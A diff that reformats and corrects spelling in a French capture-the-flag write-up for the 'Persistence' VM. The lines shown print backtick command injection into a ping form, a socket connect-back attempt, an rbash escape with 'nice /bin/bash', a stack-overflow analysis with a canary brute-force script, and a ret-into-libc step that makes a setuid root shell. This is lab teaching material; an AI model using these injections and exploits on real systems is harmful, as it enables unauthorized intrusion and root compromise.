@@ -43,7 +43,7 @@ Il y a fort à parier qu'il y ait soit un filtre assez complexe sur le champ de 
 
 Mon adresse IP étant 192.168.1.3 (celle de la VM 192.168.1.21) j'ai utilisé des backticks avec un test conditionnel pour tester la présence de fichiers sur le système. Ainsi si je rentre le texte suivi dans le champ du formulaire :  
 
-```
+```bash
 -c 1 `[ -f /etc/passwd ] && echo 192.168.1.3`
 ```
 
@@ -51,13 +51,13 @@ j'obtiens bien un ICMP echo reply en retour.
 
 En revanche avec  
 
-```
+```bash
 -c 1 `[ -f /usr/bin/cat ] && echo 192.168.1.3`
 ```
 
 nada ! Alors qu'avec  
 
-```
+```bash
 -c 1 `[ -f /bin/bash ] && echo 192.168.1.3`
 ```
 
@@ -95,7 +95,7 @@ with open("/tmp/files.txt") as fd:
         time.sleep(0.1)
 ```
 
-Le path du fichier en cours de vérification est placé dans le fichier local */tmp/current\_path*. Un système de lock empèche le second script de se prendre les pieds avec celui-ci.  
+Le path du fichier en cours de vérification est placé dans le fichier local `/tmp/current_path`. Un système de lock empêche le second script de se prendre les pieds avec celui-ci.  
 
 Le second script est un sniffer en Python qui utilise la librairie *Pcapy* pour sniffer et *Impacket* pour décoder les trames réseau :  
 
@@ -131,7 +131,7 @@ while True:
                     print buff
 ```
 
-J'ai ainsi récupérer la liste de fichiers suivants pour /etc :  
+J'ai ainsi récupéré la liste de fichiers suivants pour `/etc` :  
 
 ```
 /etc/passwd
@@ -142,7 +142,7 @@ J'ai ainsi récupérer la liste de fichiers suivants pour /etc :
 /etc/php.ini
 ```
 
-Pour /bin :  
+Pour `/bin` :  
 
 ```
 /bin/ls
@@ -156,7 +156,7 @@ Pour /bin :
 /bin/sh
 ```
 
-ce qui est plutôt limité... et pour /usr/bin  
+Ce qui est plutôt limité... et pour `/usr/bin`  
 
 ```
 /usr/bin/tr
@@ -170,17 +170,17 @@ On est donc visiblement dans un *chroot*. Notez qu'il serait aussi possible de t
 
 Si on tente d'établir une connexion sortante via *Python* en injectant :  
 
-```
+```bash
 -c 1 `python -c 'import socket;socket.socket().connect(("192.168.1.3",21))';echo 192.168.1.3`
 ```
 
 alors aucune connexion n'est établie, en revanche le script PHP prend un certain temps à répondre preuve que le firewall doit jeter la connexion au lieu de forcer sa fermeture.  
 
-A tout hasard j'ai essayé via *Python* de scanner les ports de la machine hôte depuis la VM en TCP et UDP : vraiment rien ne sort.  
+À tout hasard, j'ai essayé via *Python* de scanner les ports de la machine hôte depuis la VM en TCP et UDP : vraiment rien ne sort.  
 
-Le serveur web étant un *nginx* on trouve facilement via une recherche *duckduckgo* quel est le path par défaut. On peut confirmer le chemin du script *debug.php* avec cette commande :  
+Le serveur web étant un *nginx* on trouve facilement via une recherche *duckduckgo* quel est le path par défaut. On peut confirmer le chemin du script `debug.php` avec cette commande :  
 
-```
+```bash
 -c 1 `[ -f /usr/share/nginx/html/debug.php ] && echo 192.168.1.3`
 ```
 
@@ -330,7 +330,7 @@ http {
 }
 ```
 
-et le fichier */etc/nginx/conf.d/default.conf*  
+et le fichier `/etc/nginx/conf.d/default.conf`  
 
 ```
 # The default server
@@ -384,13 +384,13 @@ server {
 }
 ```
 
-Le *php.ini* ne nous est finalement d'aucune utilité et les fichiers récupérés ne sont malheureusement pas très utiles non plus.  
+Le `php.ini` ne nous est finalement d'aucune utilité et les fichiers récupérés ne sont malheureusement pas très utiles non plus.  
 
-Ça devient plus intéressant si on injecte un *ls -alR* d'un dossier de notre choix, que l'on redirige l'output vers un fichier dans */tmp* et que l'on rapatrie cet output via notre script.  
+Ça devient plus intéressant si on injecte un `ls -alR` d'un dossier de notre choix, que l'on redirige l'output vers un fichier dans `/tmp` et que l'on rapatrie cet output via notre script.  
 
-Je ne vous donne pas toutes les lignes que j'ai pu récupérer mais on découvre que dans */dev* il n'y a que *null*, *random* et *urandom*, que dans */etc* il n'y a que le script nécessaire mais il n'y a pas de *rc.d* ni de *init.d* et enfin qu'il n'y a pas de */root* (ce qui confirme encore plus l'utilisation d'un *chroot*).  
+Je ne vous donne pas toutes les lignes que j'ai pu récupérer, mais on découvre que dans `/dev` il n'y a que `null`, `random` et `urandom`, que dans `/etc` il n'y a que le script nécessaire, mais il n'y a pas de `rc.d` ni de `init.d` et enfin qu'il n'y a pas de `/root` (ce qui confirme encore plus l'utilisation d'un *chroot*).  
 
-Par contre ce qui est intéressant c'est ceci :  
+Par contre, ce qui est intéressant, c'est ceci :  
 
 ```
 /usr/share/nginx/html:
@@ -427,7 +427,7 @@ if (isset($_POST["addr"]))
 
 Ensuite le binaire setuid root *sysadmin-tool* est accessible via le navigateur (yes !).  
 
-Un strings permet d'obtenir une idée de ce qu'il fait  
+Un `strings` permet d'obtenir une idée de ce qu'il fait  
 
 ```
 /lib/ld-linux.so.2
@@ -456,14 +456,14 @@ Use avida:dollars to access.
 /nginx/usr/share/nginx/html/breakout
 ```
 
-On injecte une commande pour appeler *sysadmin-tool --activate-service* et bing ! Un port 22 (SSH) est ouvert sur lequel on peut se connecter avec le login *avida* et le mot de passe *dollars*.  
+On injecte une commande pour appeler `sysadmin-tool --activate-service` et bing ! Un port 22 (SSH) est ouvert sur lequel on peut se connecter avec le login *avida* et le mot de passe *dollars*.  
 
 Prison break
 ------------
 
-Une fois connecté on a la joie (ou pas) de se retrouver dans un bash restreint (*rbash*) :  
+Une fois connecté on a la joie (ou pas) de se retrouver dans un bash restreint (`rbash`) :  
 
-```
+```console
 $ ssh avida@192.168.1.21
 avida@192.168.1.21's password: 
 Last login: Mon Mar 17 17:13:40 2014 from 10.0.0.210
@@ -519,22 +519,22 @@ declare -rx SHELL="/bin/rbash"
 declare -x USER="avida"
 ```
 
-Les variables d'environnement *SHELL* et *PATH* sont un lecture seule... Ce serait trop simple. Idem pas d'accès sur le système de fichiers.  
+Les variables d'environnement *SHELL* et *PATH* sont en lecture seule... Ce serait trop simple. Idem pas d'accès sur le système de fichiers.  
 
-Dans le seul path qui nous est laissé (*/home/avida/usr/bin*) on trouve la commande *nice* qui permet de passer des commandes et ainsi de s'échapper du *rbash* :  
+Dans le seul path qui nous est laissé (`/home/avida/usr/bin`) on trouve la commande `nice` qui permet de passer des commandes et ainsi de s'échapper du `rbash` :  
 
-```
+```console
 -rbash-4.1$ nice /usr/bin/sudo -l
 [sudo] password for avida: 
 Sorry, user avida may not run sudo on persistence.
 ```
 
-Pour obtenir un shell on utilisera *nice /bin/bash*. Il faut ensuite corriger le *PATH* et la variable *SHELL* pour ne pas être embêté.  
+Pour obtenir un shell, on utilisera `nice /bin/bash`. Il faut ensuite corriger le *PATH* et la variable *SHELL* pour ne pas être embêté.  
 
 Shall we play a game ?
 ----------------------
 
-Avec notre nouveau shell on remarque dans les processus un programme *wopr* lancé par root :  
+Avec notre nouveau shell, on remarque dans les processus un programme `wopr` lancé par root :  
 
 ```
 root      1020  0.0  0.0   2004   412 ?        S    Sep08   0:00 /usr/local/bin/wopr
@@ -542,7 +542,7 @@ root      1020  0.0  0.0   2004   412 ?        S    Sep08   0:00 /usr/local/bin/
 
 Ce programme n'est pas setuid mais qu'importe si on peut l'exploiter :  
 
-```
+```console
 bash-4.1$ strings /usr/local/bin/wopr
 /lib/ld-linux.so.2
 __gmon_start__
@@ -589,15 +589,15 @@ accept
 [+] bye!
 ```
 
-Un *nm* sur le binaire retourne la liste des fonctions importées et montre la présence d'une méthode interne baptisée *get\_reply*.  
+Un *nm* sur le binaire retourne la liste des fonctions importées et montre la présence d'une méthode interne baptisée `get_reply`.  
 
-Le binaire utitise les fonctions memcpy, read et setenv ainsi que les fonctions classiques de sockets.  
+Le binaire utilise les fonctions `memcpy`, `read` et `setenv` ainsi que les fonctions classiques de sockets.  
 
-Il écoute sur le port TCP 3333, affirme qu'il enregistre les requêtes dans *$TMPLOG* (défini à */tmp/log*) sauf que ce n'est pas le cas d'après le code désassemblé.  
+Il écoute sur le port TCP 3333, affirme qu'il enregistre les requêtes dans `$TMPLOG` (défini à `/tmp/log`) sauf que ce n'est pas le cas d'après le code désassemblé.  
 
-Lors d'une connexion il *fork()*, lit les données puis les passe à *get\_reply* que voici :  
+Lors d'une connexion il `fork()`, lit les données puis les passe à `get_reply` que voici :  
 
-```
+```nasm
 [0x080486c0]> pdf@sym.get_reply
 |          ; CODE (CALL) XREF from 0x08048ad1 (fcn.080487de)
 / (fcn) sym.get_reply 106
@@ -638,19 +638,19 @@ Lors d'une connexion il *fork()*, lit les données puis les passe à *get\_reply
 \          0x080487dd    c3           ret
 ```
 
-A l'entrée de cette méthode eax et ecx pointent vers la chaine reçue et edx vaut 512 ce qui est la taille maxi utilisée par *recv*.  
+À l'entrée de cette méthode eax et ecx pointent vers la chaine reçue et edx vaut 512 ce qui est la taille maxi utilisée par `recv`.  
 
-Seulement cette chaîne est copiée via *memcpy* à l'adresse *ebp-0x22* soit 34 octets avant d'écraser l'ancien frame pointeur. Il y a donc un stack overflow.  
+Seulement cette chaîne est copiée via `memcpy` à l'adresse `ebp-0x22` soit 34 octets avant d'écraser l'ancien frame pointeur. Il y a donc un stack overflow.  
 
-La difficulté ici réside dans la présence de *\_\_stack\_chk\_fail* qui vérifie la présence d'un stack-cookie situé en *ebp-0x4*.  
+La difficulté ici réside dans la présence de `__stack_chk_fail` qui vérifie la présence d'un stack-cookie situé en `ebp-0x4`.  
 
-Il est défini à l'adresse *0x0804878c* (récupéré depuis *gs:0x14*), sauvé dans *ebp-0x4* puis cette valeur sauvé est comparée en *0x080487cb* avec la valeur initiale.  
+Il est défini à l'adresse `0x0804878c` (récupéré depuis `gs:0x14`), sauvé dans `ebp-0x4` puis cette valeur sauvée est comparée en `0x080487cb` avec la valeur initiale.  
 
-Par conséquent on ne peut pas écraser l'adresse de retour sans avoir aussi écrasé le stack cookie qui quitte prématurément le programme :(  
+Par conséquent, on ne peut pas écraser l'adresse de retour sans avoir aussi écrasé le stack cookie qui quitte prématurément le programme :(  
 
-Ainsi si on envoie 64 caractères *A* sur notre *wopr* en local :  
+Ainsi si on envoie 64 caractères *A* sur notre `wopr` en local :  
 
-```
+```console
 $ ./wopr
 [+] bind complete
 [+] waiting for connections
@@ -697,40 +697,40 @@ La pile est malheureusement non-exécutable et l'ASLR n'est pas activé sur la V
 
 Le déboguage en local du programme permet de déterminer plus facilement les adresses que l'on aura à écraser.  
 
-Pour cela il faut utiliser la commande gdb *set follow-fork-mode child* qui indique à gdb de tracer le processus fils lors d'un *fork()*.  
+Pour cela il faut utiliser la commande gdb `set follow-fork-mode child` qui indique à gdb de tracer le processus fils lors d'un `fork()`.  
 
-Si on envoie une chaîne générée via Python (*"A" \* 30 + "CCCC" + "D"\*4 + "E"\*4 + "F"\*4 + "G"\*4 + "H" \* 4*) alors :  
+Si on envoie une chaîne générée via Python (`"A" * 30 + "CCCC" + "D"*4 + "E"*4 + "F"*4 + "G"*4 + "H" * 4`) alors :  
 
-* esp pointe vers AAAA...
+* `esp` pointe vers AAAA...
 * le cookie (canary) est écrasé par CCCC
 * l'adresse de retour est écrasée par EEEE
 
 La procédure d'attaque est la suivante : on ne peut pas utiliser la stack en raison de NX et on ne peut pas non plus placer un shellcode en environnement car le programme est déjà en fonctionnement, il faut donc profiter de l'absence de l'ASLR pour faire un *ret-into-libc*.  
 
-Via gdb on trouve l'adresse de *system* :  
+Via gdb on trouve l'adresse de `system` :  
 
 ```
 (gdb) p system
 $1 = {<text variable, no debug info>} 0x16c210 <system>
 ```
 
-Notez que l'adresse de *system* comporte un octet nul qui est, comme expliqué sur le [CTF Xerxes2]({% link _posts/2014-08-14-Solution-du-CTF-Xerxes-2.md %}), un mécanisme de protection de gcc.  
+Notez que l'adresse de `system` comporte un octet nul qui est, comme expliqué sur le [CTF Xerxes2]({% link _posts/2014-08-14-Solution-du-CTF-Xerxes-2.md %}), un mécanisme de protection de gcc.  
 
-Mais comme on n'est pas en face d'un *strcpy* les octets nuls n'ont pas d'importance.  
+Mais comme on n'est pas en face d'un `strcpy` les octets nuls n'ont pas d'importance.  
 
-Il nous faut aussi l'adresse d'une chaîne correspondant au path d'un fichier sur le système. Ici, il y a une chaîne fixe dans le binaire : */tmp/log* qui est à *0x08048c60*.  
+Il nous faut aussi l'adresse d'une chaîne correspondant au path d'un fichier sur le système. Ici, il y a une chaîne fixe dans le binaire : `/tmp/log` qui est à `0x08048c60`.  
 
 On sait donc ce que l'on va mettre sur la stack... Ne nous reste plus que le *canary* :(  
 
-*memcpy* a l'avantage d'écrire strictement ce qu'on lui demande : il n'ajoute pas de zéro terminal.  
+`memcpy` a l'avantage d'écrire strictement ce qu'on lui demande : il n'ajoute pas de zéro terminal.  
 
-Par conséquent si on écrase le premier octet du *canary* par la valeur qui était déjà présente alors le programme fonctionnera correctement. Il retournera dans le main depuis *get\_reply* et enverra *"bye"* sur la socket.  
+Par conséquent, si on écrase le premier octet du *canary* par la valeur qui était déjà présente alors le programme fonctionnera correctement. Il retournera dans le `main` depuis `get_reply` et enverra *"bye"* sur le socket.  
 
-Si on écrase cet octet par une valeur différente alors *\_\_stack\_chk\_fail* sera appelé et *"bye"* ne sera pas envoyé.  
+Si on écrase cet octet par une valeur différente alors `__stack_chk_fail` sera appelé et *"bye"* ne sera pas envoyé.  
 
 Il suffit donc d'essayer toutes les valeurs possibles pour ce premier octet, trouver la bonne valeur puis passer à l'octet suivant du canary et ainsi de suite.  
 
-Comme le programme *fork()* la valeur du canary reste constante à l'exécution du programme (la mémoire du processus est recopiée par *fork()*) on peut donc bruteforcer octet par octet sans crainte.  
+Comme le programme `fork()` la valeur du canary reste constante à l'exécution du programme (la mémoire du processus est recopiée par `fork()`) on peut donc bruteforcer octet par octet sans crainte.  
 
 Le code suivant permet de retrouver le canary :  
 
@@ -758,7 +758,7 @@ for i in range(0, 4):
                 s.close()
 ```
 
-En local l'exécution est quasi-immédiate. Sur la VM c'est plus lent, peut être le fait de l'avoir bourriné avant :p  
+En local l'exécution est quasi immédiate. Sur la VM c'est plus lent, peut-être le fait de l'avoir bourriné avant :p  
 
 On obtient ce résultat :  
 
@@ -769,7 +769,7 @@ canary = 77b717
 canary = 77b717d5
 ```
 
-Le canary est à lire en sens inverse, sa valeur est *0xd517b777*.  
+Le canary est à lire en sens inverse, sa valeur est `0xd517b777`.  
 
 On a maintenant toutes les informations en main.  
 
@@ -789,7 +789,7 @@ int main(void)
 }
 ```
 
-et j'ai créé le script shell */tmp/log* suivant (ne pas oublier de le rendre exécutable) :  
+et j'ai créé le script shell `/tmp/log` suivant (ne pas oublier de le rendre exécutable) :  
 
 ```bash
 #!/bin/bash
@@ -821,7 +821,7 @@ s.recv(2014)
 s.close()
 ```
 
-Une fois exécuté, le processus *wopr* exécute */tmp/log* via *system()* ce qui rend notre binaire *getroot* setuid root et nous ouvre la porte :)  
+Une fois exécuté, le processus `wopr` exécute `/tmp/log` via `system()` ce qui rend notre binaire `getroot` setuid root et nous ouvre la porte :)  
 
 ```
 bash-4.1# cat flag.txt
